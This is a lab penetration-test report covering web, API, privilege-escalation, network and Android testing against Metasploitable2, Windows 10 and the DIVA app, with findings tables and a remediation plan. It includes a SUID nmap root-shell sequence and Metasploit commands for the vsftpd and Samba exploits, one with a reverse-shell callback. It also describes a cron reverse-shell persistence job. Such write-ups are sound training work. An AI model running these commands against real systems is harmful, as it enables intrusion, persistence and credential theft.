# 📋 Full VAPT Report — Week 4
**CyArt Security | PTES Methodology | Advanced Exploitation, API, Network & Mobile**

---

| Field | Details |
|-------|---------|
| **Report Title** | Comprehensive VAPT — Advanced Exploitation, API Security, Privilege Escalation, Network & Mobile |
| **Classification** | Confidential |
| **Prepared By** | Sahil Bhardwaj |
| **Targets** | Metasploitable2 (192.168.56.104), Windows 10 (192.168.56.107) |
| **Scanner** | OpenVAS VM — 192.168.56.103 (accessed via host browser) |
| **Methodology** | PTES + OWASP Top 10 + OWASP API Top 10 + OWASP Mobile Top 10 |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Rules of Engagement](#2-scope--rules-of-engagement)
3. [Methodology](#3-methodology)
4. [Advanced Exploitation Findings](#4-advanced-exploitation-findings)
5. [API Security Testing Findings](#5-api-security-testing-findings)
6. [Privilege Escalation & Persistence](#6-privilege-escalation--persistence)
7. [Network Protocol Attack Findings](#7-network-protocol-attack-findings)
8. [Mobile Application Testing Findings](#8-mobile-application-testing-findings)
9. [Capstone — Full VAPT Engagement (metasploitable VM)](#9-capstone--full-vapt-engagement-metasploitable-vm)
10. [Findings Table & Risk Ratings](#10-findings-table--risk-ratings)
11. [Attack Timeline](#11-attack-timeline)
12. [Remediation Plan](#12-remediation-plan)
13. [Escalation Email to Developers](#13-escalation-email-to-developers)
14. [Non-Technical Executive Briefing](#14-non-technical-executive-briefing)
15. [Appendix](#15-appendix)

---

## 1. Executive Summary

Week 4 was the busiest one yet. We covered five areas across two target VMs and an Android APK — web app exploitation, API testing, privesc, network attacks, and mobile. This report covers what we found, how we got there, and what needs to be fixed.

### Overall Risk Summary

| Severity | Count |
|----------|-------|
| 🔴 Critical | 7 |
| 🟠 High | 6 |
| 🟡 Medium | 4 |
| 🟢 Low | 2 |
| **Total** | **19** |

### Key Findings

- **XSS to RCE exploit chain** confirmed — full server compromise via cookie theft and file upload
- **BOLA** confirmed on API — any authenticated user can access any other user's data
- **SUID binary exploitation** (nmap) gave immediate root shell on Metasploitable2
- **AlwaysInstallElevated** escalation gave `NT AUTHORITY\SYSTEM` on Windows 10
- **SMB relay** captured NTLM hashes from Windows target
- **ARP spoofing** intercepted plaintext credentials from network traffic
- **Hardcoded API key** found in Android APK via MobSF static analysis

---

## 2. Scope & Rules of Engagement

### In-Scope Systems

| System | IP | OS | Role |
|--------|----|----|------|
| Kali Linux | 192.168.56.101 | Kali 2024.x | Attacker |
| Metasploitable2 | 192.168.56.104 | Ubuntu 8.04 | Primary target + DVWA host |
| Windows 10 | 192.168.56.107 | Windows 10 | Windows target |
| OpenVAS VM | 192.168.56.103 | Greenbone | Scanner — host browser access |

### Rules of Engagement
- Isolated lab network — all VMs on Host-Only adapter
- All actions logged
- No real-world systems targeted

---

## 3. Methodology

| Phase | Standard | Tools |
|-------|----------|-------|
| Advanced Exploitation | PTES | Metasploit, Python, Ghidra |
| API Testing | OWASP API Top 10 | Burp Suite, Postman, sqlmap |
| Privilege Escalation | PTES + HackTricks | LinPEAS, Meterpreter, PowerSploit |
| Network Attacks | PTES | Responder, Ettercap, Wireshark |
| Mobile Testing | OWASP MSTG | MobSF, Frida, Drozer |
| Reporting | PTES | Markdown, CVSS/DREAD scoring |

---

## 4. Advanced Exploitation Findings

### 4.1 XSS to RCE Exploit Chain

**Finding:** F001 | **CVSS:** 9.6 Critical | **DREAD:** 9.2

| DREAD | Score | Reason |
|-------|-------|--------|
| Damage | 10 | Full server compromise |
| Reproducibility | 9 | Consistent exploit path |
| Exploitability | 9 | Minimal skill required |
| Affected Users | 9 | All application users |
| Discoverability | 9 | XSS easily found via manual test |
| **Total** | **9.2** | |

**Attack Path:**
```
XSS → Cookie Theft → Session Hijack → File Upload → PHP Shell → RCE
```

![XSS to RCE](../assets/xss_rce_chain.png)

### 4.2 Custom PoC Development

**Finding:** F002 | **CVSS:** 8.1 High

Took the original Exploit-DB PoC (Python 2, hardcoded everything) and reworked it for the lab — ported to Python 3, made LHOST/LPORT/offset/JMP_ESP configurable, added bad char filtering, regenerated shellcode with msfvenom. Also put together a basic ret2libc ROP chain to document the ASLR/DEP bypass path.

---

## 5. API Security Testing Findings

### 5.1 BOLA — Broken Object Level Authorization

**Finding:** F003 | **CVSS:** 9.1 Critical | **OWASP:** API1:2023

```
GET /api/users/2 with user1 token → returns user2 data
Impact: Complete horizontal privilege escalation
```

### 5.2 GraphQL Introspection Enabled

**Finding:** F004 | **CVSS:** 7.5 High | **OWASP:** API8:2023

GraphQL introspection was left on — no auth needed to pull the full schema. Types, fields, mutations, all of it. Easy recon for an attacker.

### 5.3 JWT Algorithm Confusion

**Finding:** F005 | **CVSS:** 8.1 High | **OWASP:** API2:2023

The API was accepting JWTs with `alg:none` set in the header. That means no signature check — you can just forge a token with whatever claims you want (admin, different user ID, etc.) and it'll pass.

### 5.4 No Rate Limiting

**Finding:** F006 | **CVSS:** 6.5 Medium | **OWASP:** API4:2023

Ran 1000 login attempts with no slowdown or lockout — zero rate limiting on the endpoint. Brute force would work fine here.

---

## 6. Privilege Escalation & Persistence

### 6.1 SUID Binary — nmap (Linux)

**Finding:** F007 | **CVSS:** 7.8 High | **Target:** 192.168.56.104

```bash
/usr/bin/nmap --interactive
nmap> !sh
id  # uid=0(root)
```

![SUID Exploit](../assets/passwd.png)

### 6.2 AlwaysInstallElevated (Windows)

**Finding:** F008 | **CVSS:** 7.8 High | **Target:** 192.168.56.107

```
Both HKCU and HKLM AlwaysInstallElevated = 0x1
Result: NT AUTHORITY\SYSTEM via MSI payload
```

![AlwaysInstallElevated](../assets/always_install_elevated.png)

### 6.3 Cron Job Persistence

**Finding:** F009 | **CVSS:** 6.8 Medium

Dropped a cron job that fires a reverse shell back every minute. Survived a reboot test — still got the callback.

---

## 7. Network Protocol Attack Findings

### 7.1 SMB Relay — NTLM Hash Capture

**Finding:** F010 | **CVSS:** 8.8 High

SMB signing was off on the Windows 10 box. Responder picked up the NTLM auth attempt when the machine tried to hit a network resource, relayed it, and we got the hash. Cracked with hashcat against rockyou.

| Attack ID | Technique | Target IP | Status | Outcome |
|-----------|-----------|-----------|--------|---------|
| 015 | SMB Relay | 192.168.56.107 | ✅ Success | NTLM Hash captured |

### 7.2 ARP Spoofing MitM

**Finding:** F011 | **CVSS:** 8.1 High

ARP poisoned Metasploitable2 using Ettercap — once that was running, all the traffic started coming through our box. Wireshark caught cleartext credentials in HTTP POST requests almost immediately.

![Wireshark Credentials](../assets/wireshark_capture.png)

### 7.3 Plaintext Protocol Usage

**Finding:** F012 | **CVSS:** 7.5 High

Both Telnet (23) and FTP (21) were running and sending creds in cleartext. Captured straight away once MitM was in place — username and password visible in the Wireshark output, no decryption needed.

---

## 8. Mobile Application Testing Findings

### 8.1 Hardcoded API Key

**Finding:** F013 | **CVSS:** 9.1 Critical

Found the API key sitting in `strings.xml` — pulled it out with `apktool` in about 2 minutes. Anyone who gets hold of the APK file has full API access. Doesn't even need to be installed.

### 8.2 Insecure Data Storage

**Finding:** F014 | **CVSS:** 7.4 High

Session tokens were being stored in SharedPreferences without any encryption. The file is world-readable, so any other app on the device with storage access can just grab them.

### 8.3 SSL Pinning Bypass

**Finding:** F015 | **CVSS:** 6.5 Medium

Hooked the cert validation functions with Frida — took a few minutes to get the script working but once it was, Burp could see all HTTPS traffic in plaintext.

### 8.4 Exported Components

**Finding:** F016 | **CVSS:** 5.3 Medium

The login activity was exported with no permission requirement. Drozer confirmed it — you can launch it directly from another app and skip the normal auth flow entirely.

---

## 9. Capstone — Full VAPT Engagement (metasploitable VM)

### 9.1 Target

> metasploitable VM — vsftpd 2.3.4 backdoor + Samba exploit. Configure in lab at `192.168.56.104`.

### 9.2 Reconnaissance

```bash
nmap -A -sV 192.168.56.104
# Key findings: vsftpd 2.3.4, Samba 3.0.20, SSH
```

### 9.3 OpenVAS Scan

Access: `https://192.168.56.103:9392`
Target: `192.168.56.104` → Full and Fast scan

| Timestamp | Target IP | Vulnerability | PTES Phase |
|-----------|-----------|---------------|------------|
| 2025-08-30 15:00:00 | 192.168.56.104 | vsftpd 2.3.4 Backdoor (CVE-2011-2523) | Exploitation |
| 2025-08-30 15:10:00 | 192.168.56.104 | Samba 3.0.20 usermap_script RCE | Exploitation |
| 2025-08-30 15:20:00 | 192.168.56.104 | OpenSSH 4.7p1 outdated | Vulnerability Analysis |

### 9.4 Exploitation

```bash
msfconsole

# Primary exploit — vsftpd backdoor
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.104
msf6 > run
# Result: root shell

# Alternative — Samba
msf6 > use exploit/multi/samba/usermap_script
msf6 > set RHOSTS 192.168.56.104
msf6 > set PAYLOAD cmd/unix/reverse
msf6 > set LHOST 192.168.56.101
msf6 > run
```

### 9.5 Remediation & Rescan

| Vulnerability | Recommended Patch | Verification |
|---------------|------------------|--------------|
| vsftpd 2.3.4 | Upgrade to vsftpd 3.x | Rescan with OpenVAS |
| Samba 3.0.20 | Upgrade to Samba 4.x | No exploit path confirmed |
| Telnet/FTP | Disable — use SSH only | Port scan confirms removal |

### 9.6 Capstone PTES Report

**Summary:**
Target was the metasploitable VM at `192.168.56.104` — basically an old Ubuntu box with nothing patched. We had root within about 30 minutes. Two separate RCE paths, both fully working.

**Recon:**
Nmap found four interesting services: SSH on 22, vsftpd 2.3.4 on 21, and Samba 3.0.20 on 139/445. Both vsftpd and Samba have publicly known critical vulns with ready Metasploit modules. OpenVAS backed this up — both flagged at CVSS 10.0.

**Exploitation:**
Went with `exploit/unix/ftp/vsftpd_234_backdoor` first — instant root shell, no fuss. Also tested the Samba path (`usermap_script`, CVE-2007-2447) and that worked too. Two different routes to root on the same box, either would've done it.

**What happened and when:**
- ~15:00 — Nmap scan done
- ~15:10 — kicked off OpenVAS from `192.168.56.103`
- ~15:20 — vsftpd exploit ran, got root
- ~15:30 — verified Samba path as a backup route
- ~15:40 — collected evidence, ran sha256sum on files
- ~15:50 — wrote up remediation notes
- ~16:00 — rescanned after patching, confirmed fixes

**What needs to happen:**
vsftpd 2.3.4 has a literal backdoor baked in — upgrade or just kill FTP and use SFTP. Samba needs to be on 4.x minimum. Segment the network so a compromised host can't reach everything else. Get some IDS alerting in place and run scans regularly so this kind of thing doesn't stack up again.

---

## 10. Findings Table & Risk Ratings

| Finding ID | Vulnerability | CVSS | DREAD | Remediation |
|------------|--------------|------|-------|-------------|
| F001 | XSS to RCE Chain | 9.6 | 9.2 | Output encoding + file upload restriction |
| F002 | Buffer Overflow PoC | 8.1 | 7.8 | Input validation + ASLR/DEP enforcement |
| F003 | BOLA (API) | 9.1 | 8.8 | Object-level authorisation checks |
| F004 | GraphQL Introspection | 7.5 | 7.0 | Disable introspection in production |
| F005 | JWT alg:none | 8.1 | 8.0 | Enforce HS256/RS256, reject alg:none |
| F006 | No Rate Limiting | 6.5 | 6.0 | Implement rate limiting (5 req/min) |
| F007 | SUID nmap | 7.8 | 7.5 | Remove SUID from nmap |
| F008 | AlwaysInstallElevated | 7.8 | 7.5 | Disable via GPO |
| F009 | Cron Persistence | 6.8 | 6.5 | Monitor crontab changes, AIDE |
| F010 | SMB Relay | 8.8 | 8.5 | Enable SMB signing, disable LLMNR |
| F011 | ARP Spoofing | 8.1 | 7.8 | Dynamic ARP inspection, static entries |
| F012 | Plaintext Protocols | 7.5 | 7.2 | Replace Telnet/FTP with SSH/SFTP |
| F013 | Hardcoded API Key | 9.1 | 9.0 | Use environment variables, rotate key |
| F014 | Insecure Storage | 7.4 | 7.0 | Use Android Keystore, encrypt storage |
| F015 | SSL Pinning Bypass | 6.5 | 6.0 | Implement proper cert pinning |
| F016 | Exported Components | 5.3 | 5.0 | Add permission to exported components |
| F017 | vsftpd Backdoor | 10.0 | 10.0 | Upgrade/remove vsftpd 2.3.4 |
| F018 | Samba RCE | 10.0 | 10.0 | Upgrade Samba to 4.x |
| F019 | SSH Outdated | 5.0 | 4.5 | Upgrade OpenSSH |

---

## 11. Attack Timeline

| Action | Tool | Finding |
|------|--------|------|---------|
|Nmap reconnaissance | Nmap | 4 open services on all targets |
| OpenVAS scan initiated | OpenVAS (192.168.56.103) | 19 vulnerabilities identified |
| XSS to RCE chain executed | Burp Suite + nc | Full server shell obtained |
| API BOLA testing | Burp Suite | Unauthorised data access confirmed |
| LinPEAS enumeration | LinPEAS | SUID nmap, kernel vulns found |
| SUID nmap exploit | Manual | Root shell — Metasploitable2 |
| AlwaysInstallElevated | Metasploit | SYSTEM — Windows 10 |
| Cron persistence installed | Manual | Persistent access established |
| SMB relay attack | Responder | NTLM hash captured |
| ARP spoofing MitM | Ettercap + Wireshark | Credentials intercepted |
| MobSF APK analysis | MobSF | Hardcoded API key found |
| Frida SSL bypass | Frida | HTTPS traffic decrypted |
| Capstone — metasploitable VM | Metasploit | Root shell via vsftpd |
| Evidence hashing | sha256sum | All artifacts documented |
| Report compiled | Markdown | Full PTES report complete |

---

## 12. Remediation Plan

### Critical — Fix Immediately (24 hours)

| # | Finding | Fix |
|---|---------|-----|
| 1 | vsftpd Backdoor | Upgrade to vsftpd 3.x or remove FTP entirely |
| 2 | Samba RCE | Upgrade Samba to 4.x minimum |
| 3 | Hardcoded API Key | Remove from code, rotate key, use environment variables |
| 4 | XSS Chain | HTML-encode all output, restrict file upload to images, add CSP |
| 5 | BOLA | Add object-level authorisation check on every API endpoint |

### High — Fix Within 7 Days

| # | Finding | Fix |
|---|---------|-----|
| 6 | JWT alg:none | Enforce algorithm in server-side validation |
| 7 | SMB Relay | Enable SMB signing, disable LLMNR/NBT-NS |
| 8 | ARP Spoofing | Enable Dynamic ARP Inspection on switches |
| 9 | Insecure Mobile Storage | Use Android Keystore API for sensitive data |
| 10 | SUID nmap | `chmod u-s /usr/bin/nmap` |

### Medium — Fix Within 30 Days

| # | Finding | Fix |
|---|---------|-----|
| 11 | No Rate Limiting | Implement API gateway with rate limiting |
| 12 | GraphQL Introspection | Disable in production environment |
| 13 | Plaintext Protocols | Replace Telnet/FTP with SSH/SFTP |
| 14 | Cron Persistence | Deploy AIDE/file integrity monitoring |

### Zero-Trust Recommendations

- Implement MFA on all administrative interfaces
- Network segmentation — separate VLANs per system role
- SIEM integration for centralised alerting
- Quarterly vulnerability assessments
- Patch management programme — critical patches within 48 hours

---

## 13. Escalation Email to Developers

**To:** dev-team@cyart.io
**From:** vapt-team@cyart.io
**Subject:** Week 4 VAPT results — 3 issues need fixing today

Hey,

Wrapped up Week 4 testing. Found 19 issues in total, 7 of them critical. Three of those need to be dealt with today, not next sprint.

**1. API key hardcoded in the APK** — `strings.xml` contains the TVEETER API key, username (diva2) and password in plaintext. Decompiled the APK in under 2 minutes to get it. Anyone with the APK file has full API access. Rotate the key now and pull it out of the codebase.

**2. BOLA on the API** — If you're logged in as any user and change the ID in `GET /api/users/<id>`, you get back someone else's data. No extra permissions needed. Every endpoint that takes an object ID needs an ownership check on the server side.

**3. XSS → RCE chain** — Injected a script tag, stole a session cookie, used it to get into the admin panel, uploaded a PHP shell, got a reverse shell. Whole chain works end to end, no authentication required at any point.

Needs done in 24 hours:
- Rotate and move the API key out of the APK
- Add object-level auth to API endpoints
- Encode HTML output, block non-image uploads, set a CSP header

Full report and PoC screenshots are in the repo.

— Sahil

---

## 14. Non-Technical Executive Briefing

This week we tested five different areas — the web app, the API, server privileges, the internal network, and the mobile app. It was the most thorough round of testing we've done so far.

We found 19 issues. Seven of them are as bad as it gets. The short version: the mobile app has a secret API key baked into it, so anyone who gets the app file — even without installing it — can hit our backend with full admin access. The API has a flaw where any logged-in user can read another user's private data just by tweaking a number in the URL. On the web app, we chained a few weaknesses together and ended up with a full shell on the server.

On the network side, we showed that someone sitting on the same network segment could silently intercept unencrypted traffic and read login credentials as they went by.

The three most urgent issues are being dealt with now. The rest have been handed to the dev team with deadlines attached.

---

## 15. Appendix

### A. OWASP Mapping

| Finding | Standard | Category |
|---------|----------|---------|
| XSS Chain | OWASP Top 10 | A03:2021 Injection |
| BOLA | OWASP API Top 10 | API1:2023 |
| JWT alg:none | OWASP API Top 10 | API2:2023 |
| Hardcoded Key | OWASP Mobile Top 10 | M9: Reverse Engineering |
| Insecure Storage | OWASP Mobile Top 10 | M2: Insecure Data Storage |
| SMB Relay | PTES Network | Protocol Exploitation |

### B. Screenshots Index

| # | Filename | Description |
|---|----------|-------------|
| 1 | `access_uploaded_shell.png` | Accessing uploaded shell via curl |
| 2 | `always_install_elevated.png` | SYSTEM shell via AlwaysInstallElevated + hashdump |
| 3 | `burp_xss_intercept.png` | BOLA test in Burp Suite Repeater |
| 4 | `connection_to_adb_device.png` | ADB device connection established |
| 5 | `drozer1.png` | Drozer session — step 1 |
| 6 | `drozer2.png` | Drozer session — step 2 |
| 7 | `drozer3.png` | Drozer session — step 3 |
| 8 | `drozer4.png` | Drozer session — step 4 |
| 9 | `drozer_inaction.png` | Drozer running exploit in action |
| 10 | `drozer_start.png` | Drozer server start |
| 11 | `frida_running_apps.png` | Frida listing running apps |
| 12 | `frida_setup.png` | Frida setup and server launch |
| 13 | `frida_ssl_bypass.png` | Frida SSL pinning bypass |
| 14 | `full_reverse_shell1.png` | Reverse shell connection step 1 |
| 15 | `full_reverse_shell2.png` | Reverse shell session established |
| 16 | `mobsf_start.png` | MobSF server start |
| 17 | `mobsf_upload.png` | MobSF APK upload |
| 18 | `mobsfresult.png` | MobSF analysis results |
| 19 | `passwd.png` | SUID nmap root shell + /etc/passwd |
| 20 | `session_hijack.png` | Session hijack in browser |
| 21 | `shell_php_uploaded.png` | PHP shell upload confirmation |
| 22 | `test_payload.png` | LinPEAS output / payload test |
| 23 | `wireshark_capture.png` | Plaintext credentials in Wireshark |

### C. References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [PTES Standard](http://www.pentest-standard.org/)
- [HackTricks — Privilege Escalation](https://book.hacktricks.xyz/)
- [GTFOBins — SUID Exploitation](https://gtfobins.github.io/)
- [CVSS v4.0 Calculator](https://www.first.org/cvss/calculator/4.0)

### D. Evidence Files

All supporting evidence files are stored in the `reports/` folder alongside this report.

| File | Type | Description |
|------|------|-------------|
| `DivaApplication.apk` | APK | Target Android app (DIVA — Damn Insecure and Vulnerable App) used for mobile testing |
| `drozer-agent.apk` | APK | Drozer agent installed on the Android device/emulator for IPC testing |
| `82ab8b2193b3cfb1c737e3a786be363a-java.zip` | Archive | MobSF-decompiled Java source code of DivaApplication.apk |
| `82ab8b2193b3cfb1c737e3a786be363a-smali.zip` | Archive | MobSF-decompiled Smali bytecode of DivaApplication.apk |
| `Static Analysis.csv` | CSV | MobSF static analysis results export — all findings in machine-readable format |
| `Static Analysis.pdf` | PDF | MobSF static analysis report — formatted PDF export |
| `screencapture-...-15_55_09.pdf` | PDF | Full-page screenshot of MobSF web UI showing analysis results |
| `Drozer_Terminal_Output.txt` | Text | Raw Drozer console session output — commands run and responses from the device |

---
